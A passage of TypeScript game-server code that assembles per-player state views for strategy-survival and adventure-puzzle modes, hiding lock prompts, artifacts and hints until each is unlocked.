      mySubmission: requestingUserId ? submissionsMap[String(requestingUserId)] || null : null,
      timeline: rawState.timeline,
    };
  }

  if (engineType === 'strategy_survival') {
    const playerStates = (rawState.playerStates || {}) as Record<string, unknown>;
    return {
      engineType,
      gameSlug: rawState.gameSlug,
      mode: rawState.mode,
      waves: rawState.waves,
      myState: requestingUserId ? playerStates[String(requestingUserId)] || null : null,
      timeline: rawState.timeline,
    };
  }

  // adventure_puzzle
  const locks = (rawState.locks || []) as PuzzleLock[];
  const progressMap = (rawState.playerProgress || {}) as Record<string, { unlockedCount: number; score: number; escaped: boolean }>;
  const hintsMap = (rawState.hintsUsedByUser || {}) as Record<string, number[]>;
  const myProg = requestingUserId ? progressMap[String(userIdOrNull(requestingUserId))] : null;
  const myHints = requestingUserId ? hintsMap[String(requestingUserId)] || [] : [];
  const unlockedIdx = rawState.mode === 'coop' ? Number(rawState.sharedLockIndex || 0) : myProg?.unlockedCount ?? 0;

  return {
    engineType: 'adventure_puzzle',
    gameSlug: rawState.gameSlug,
    mode: rawState.mode,
    locks: locks.map((l, idx) => ({
      lockNumber: l.lockNumber,
      title: l.title,
      cipherType: l.cipherType,
      points: l.points,
      status: idx < unlockedIdx ? 'unlocked' : idx === unlockedIdx ? 'active' : 'sealed',
      prompt: idx <= unlockedIdx || completed ? l.prompt : 'Solve previous lock to reveal this chamber.',
      artifact: idx <= unlockedIdx || completed ? l.artifact : null,
      hint: myHints.includes(l.lockNumber) || completed ? l.hint : null,
    })),
    myProgress: myProg,
    timeline: rawState.timeline,
  };
}

function userIdOrNull(id: number): number {
  return id;
}
